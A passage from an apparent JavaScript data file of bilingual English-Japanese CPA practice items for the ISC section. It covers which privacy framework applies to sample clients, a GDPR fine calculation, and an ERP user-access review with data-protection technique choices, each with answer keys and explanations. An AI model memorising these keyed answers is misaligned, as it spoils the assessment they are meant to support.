  scenario: `<p>A consulting firm is assessing which single privacy or data security framework is <b>primarily triggered</b> by the facts of each prospective client below. Assume for the CCPA (as amended by the CPRA) that a for-profit business doing business in California is covered if it (1) has annual gross revenue over $26,625,000, (2) annually buys, sells, or shares personal information of 100,000 or more California consumers or households, or (3) derives 50% or more of annual revenue from selling or sharing California consumers' personal information. None of the clients has an establishment in the EU.</p>
<table><tr><th>Client</th><th>Facts</th></tr>
<tr><td>A</td><td>Texas online retailer; revenue $8 million; accepts credit and debit cards directly on its website; 40,000 California customers; does not sell or share personal information</td></tr>
<tr><td>B</td><td>U.S. dental practice that submits insurance claims electronically and stores patient treatment records</td></tr>
<tr><td>C</td><td>Chicago software company; revenue $5 million; uses cookies to track the online behavior of visitors located in France to deliver targeted ads; invoices customers only by bank transfer; no California customers</td></tr>
<tr><td>D</td><td>Nevada data broker; revenue $3 million, 70% of which comes from selling personal information of California residents; does not accept cards</td></tr>
<tr><td>E</td><td>Fitness app developer that collects heart-rate data directly from consumers (not on behalf of any health plan or provider); users only in Oregon and Washington; payments handled entirely by the app stores</td></tr>
<tr><td>F</td><td>Claims-processing company that processes medical claims on behalf of hospitals</td></tr></table>
<p>Separately, an EU-established group with prior-year worldwide annual turnover of €900 million asks about the maximum administrative fine for an infringement in the higher GDPR tier (e.g., violation of the basic processing principles).</p>
<p class="ja">コンサルティング会社が、見込み顧客ごとに事実関係から<b>主として適用される</b>プライバシー・データセキュリティの枠組みを1つ判定する。CCPA(CPRAによる改正後)は、カリフォルニア州で事業を行う営利事業者のうち、(1)年間総収入26,625,000ドル超、(2)カリフォルニア州の消費者・世帯10万以上の個人情報を毎年売買・共有、(3)年間収入の50%以上をカリフォルニア州消費者の個人情報の販売・共有から得る、のいずれかに該当する者に適用されるものとする。EUに拠点を持つ顧客はない。<br>A:テキサス州のネット小売業者。収入800万ドル。自社サイトでクレジット・デビットカードを直接受け付ける。カリフォルニア州の顧客4万人。個人情報の販売・共有なし。<br>B:保険請求を電子的に行い、患者の治療記録を保管する米国の歯科医院。<br>C:シカゴのソフトウェア会社。収入500万ドル。クッキーでフランス所在の訪問者のオンライン行動を追跡しターゲティング広告を配信。請求は銀行振込のみ。カリフォルニア州の顧客なし。<br>D:ネバダ州のデータブローカー。収入300万ドルで、その70%がカリフォルニア州住民の個人情報の販売による。カードは扱わない。<br>E:心拍データを消費者から直接収集するフィットネスアプリ開発者(医療保険・医療提供者のためではない)。利用者はオレゴン州とワシントン州のみ。決済はアプリストアがすべて処理。<br>F:病院のために医療請求を処理する会社。<br>別途、前年度の全世界年間売上高9億ユーロのEU拠点グループから、GDPRの上位区分の違反(処理の基本原則違反など)の制裁金上限について質問があった。</p>`,
  rows: [
    { label: "Client A(顧客A)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "PCI DSS" },
    { label: "Client B(顧客B)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "HIPAA" },
    { label: "Client C(顧客C)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "GDPR" },
    { label: "Client D(顧客D)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "CCPA (as amended by CPRA)" },
    { label: "Client E(顧客E)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "None of these" },
    { label: "Client F(顧客F)", type: "select", options: ["GDPR", "HIPAA", "PCI DSS", "CCPA (as amended by CPRA)", "None of these"], answer: "HIPAA" },
    { label: "Maximum GDPR fine for the group, € (グループのGDPR制裁金の上限、ユーロ)", type: "num", answer: 36000000 },
  ],
  explain: `<p>① 顧客A:カード会員データを自ら受け付けるため、カードブランドとの契約上PCI DSSの準拠が求められる。収入800万ドルは26,625,000ドル以下、カリフォルニア州の顧客4万人で販売・共有もないためCCPAの要件を満たさない。→ PCI DSS。</p>
<p>② 顧客B:電子的に保険請求を行う医療提供者はHIPAAの対象事業者(covered entity)である。→ HIPAA。</p>
<p>③ 顧客C:EUに拠点がなくても、EU域内にいるデータ主体の行動をモニタリングする場合はGDPRの域外適用(第3条2項)を受ける。カードを扱わず、カリフォルニア州の顧客もない。→ GDPR。</p>
<p>④ 顧客D:収入は小さいが、収入の50%以上(70%)をカリフォルニア州消費者の個人情報の販売から得ているため要件(3)に該当する。→ CCPA。</p>
<p>⑤ 顧客E:HIPAAは対象事業者とその業務提携者(business associate)にのみ適用され、消費者から直接健康データを集めるアプリには適用されない。カードを扱わず、カリフォルニア州・EUの利用者もない。→ いずれも該当しない(FTC法など他の規制は別論)。</p>
<p>⑥ 顧客F:対象事業者(病院)のためにPHIを扱う請求処理会社は業務提携者(business associate)としてHIPAAのセキュリティ規則等の直接の適用を受ける。→ HIPAA。</p>
<p>⑦ 上位区分の制裁金上限は「2,000万ユーロ」と「前年度全世界年間売上高の4%」のいずれか高い方。900,000,000×4% = 36,000,000 > 20,000,000 → 36,000,000ユーロ。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-36", section: "ISC", chapter: "ISC-02", title: "ERPの四半期アクセスレビューとデータ保護手法の選択",
  scenario: `<p>Corbin Manufacturing performs a quarterly user access review of its ERP system as of September 30, 2026.</p>
<p><b>Exhibit 1 — Access policy (excerpt)</b>: (a) No user may hold both Vendor Master Maintenance and Payment Approval. (b) Developers may not hold any role that updates production data. (c) Access of terminated employees must be removed within one business day. (d) Generic or shared accounts are prohibited. (e) When an employee transfers, roles not needed for the new job must be removed within five business days. (f) System Administrator is limited to IT Operations staff.</p>
<p><b>Exhibit 2 — HR roster changes</b>: E. Park was terminated on September 12, 2026. H. Kim transferred from Payroll to Treasury on August 1, 2026.</p>
<p><b>Exhibit 3 — ERP user listing</b></p>
<table><tr><th>User ID</th><th>Name / department</th><th>Roles</th><th>Last login</th></tr>
<tr><td>U1</td><td>A. Brooks / Accounts Payable clerk</td><td>Vendor Master Maintenance; Payment Entry</td><td>Sep 29</td></tr>
<tr><td>U2</td><td>C. Diaz / AP manager</td><td>Payment Approval; Vendor Master Maintenance</td><td>Sep 30</td></tr>
<tr><td>U3</td><td>E. Park / former AR clerk</td><td>Customer Credit Memo Entry</td><td>Sep 20</td></tr>
<tr><td>U4</td><td>G. Shah / IT developer</td><td>Developer; Production Data Update</td><td>Sep 28</td></tr>
<tr><td>U5</td><td>finance01 / (Finance team)</td><td>Journal Entry Post</td><td>Sep 30</td></tr>
<tr><td>U6</td><td>H. Kim / Treasury analyst</td><td>Payroll Processing; Treasury Wire Release</td><td>Sep 30</td></tr>
<tr><td>U7</td><td>J. Lee / IT Operations</td><td>System Administrator</td><td>Sep 30</td></tr>
<tr><td>U8</td><td>M. Ortiz / GL accountant</td><td>Journal Entry Post</td><td>Sep 30</td></tr></table>
<p><b>Exhibit 4 — Data protection requests</b>: (i) IT wants to refresh the test environment with production customer data so developers can test with realistic data that cannot be traced back to real customers. (ii) The e-commerce team wants to keep customers' card numbers for recurring billing while removing the card numbers from most of its own systems to reduce PCI DSS scope.</p>
<p class="ja">Corbin Manufacturing社は2026年9月30日時点でERPの四半期ユーザーアクセスレビューを行う。<br>証拠1(アクセス方針抜粋):(a)仕入先マスタ保守と支払承認の両方を同一ユーザーに付与しない。(b)開発者には本番データを更新するロールを付与しない。(c)退職者のアクセスは1営業日以内に削除する。(d)汎用・共有アカウントは禁止。(e)異動時、新職務に不要なロールは5営業日以内に削除する。(f)システム管理者はIT運用担当に限る。<br>証拠2(人事異動):E. Parkは2026年9月12日に退職。H. Kimは2026年8月1日に給与部門から財務部門へ異動。<br>証拠3はERPユーザー一覧(ユーザーID、氏名・部署、ロール、最終ログイン)である。<br>証拠4(データ保護の要望):(i)IT部門は本番の顧客データでテスト環境を更新し、開発者が現実的だが実在の顧客にたどれないデータでテストできるようにしたい。(ii)ECチームは継続課金のために顧客のカード番号を保持しつつ、自社システムの大半からカード番号をなくしてPCI DSSの対象範囲を縮小したい。</p>`,
  rows: [
    { label: "Number of user IDs with at least one policy exception(方針違反のあるユーザーIDの数)", type: "num", answer: 5 },
    { label: "Exception for U1(U1の指摘)", type: "select", options: ["No exception", "Segregation of duties conflict", "Terminated user with active access", "Excess access after transfer (privilege creep)", "Developer access to production data", "Generic/shared account"], answer: "No exception" },
    { label: "Exception for U2(U2の指摘)", type: "select", options: ["No exception", "Segregation of duties conflict", "Terminated user with active access", "Excess access after transfer (privilege creep)", "Developer access to production data", "Generic/shared account"], answer: "Segregation of duties conflict" },
    { label: "Exception for U6(U6の指摘)", type: "select", options: ["No exception", "Segregation of duties conflict", "Terminated user with active access", "Excess access after transfer (privilege creep)", "Developer access to production data", "Generic/shared account"], answer: "Excess access after transfer (privilege creep)" },
    { label: "Most important follow-up for U3 in addition to disabling the account(U3についてアカウント無効化に加えて最も重要な対応)", type: "select", options: ["Investigate the post-termination activity as a potential security incident", "Re-certify the account at the next quarterly review", "Ask HR to change the termination date to September 20", "Lower the password complexity requirement"], answer: "Investigate the post-termination activity as a potential security incident" },
    { label: "Best technique for request (i)(要望(i)に最適な手法)", type: "select", options: ["Static data masking", "Tokenization", "Encryption with the key shared with developers", "Digital signatures"], answer: "Static data masking" },
    { label: "Best technique for request (ii)(要望(ii)に最適な手法)", type: "select", options: ["Static data masking", "Tokenization", "One-way hashing", "Truncation to the last four digits only"], answer: "Tokenization" },
  ],
  explain: `<p>① 違反はU2(職務分離)、U3(退職者のアクセス残存)、U4(開発者の本番データ更新権限)、U5(共有アカウント)、U6(異動後の不要権限)の5件。U1、U7、U8は問題ない。</p>
<p>② U1:方針(a)が禁じるのは「仕入先マスタ保守」と「支払承認」の組合せであり、支払入力との組合せは禁止されていない。→ 指摘なし。</p>
<p>③ U2:仕入先マスタ保守と支払承認を併せ持ち、架空仕入先の登録から支払承認まで一人で完結できる。→ 職務分離の違反。</p>
<p>④ U6:8月1日の異動から2か月経っても給与処理ロールが残る。財務の送金実行と合わせると不正の機会も大きい。→ 異動後の権限の蓄積(privilege creep)、最小権限の原則違反。</p>
<p>⑤ U3:9月12日の退職後、9月20日にログインがある。単なる削除漏れではなく、退職後に不正な貸方票などが入力された可能性があるため、セキュリティインシデントとして活動内容を調査すべきである。退職日を書き換えるのは記録の改ざんであり不適切。</p>
<p>⑥ 要望(i):テスト用には実在の個人に戻せない形で現実的な値に置き換える静的データマスキングが適する。トークン化や鍵を共有する暗号化は元データに戻せるため目的に合わない。</p>
<p>⑦ 要望(ii):継続課金では元のカード番号が必要になるため不可逆なハッシュや末尾4桁への切り詰めは使えない。カード番号をトークンに置き換え、元データはトークン保管庫(ボールト)に限定するトークン化が、業務を維持しつつPCI DSSの対象範囲を縮小できる。</p>`,
});
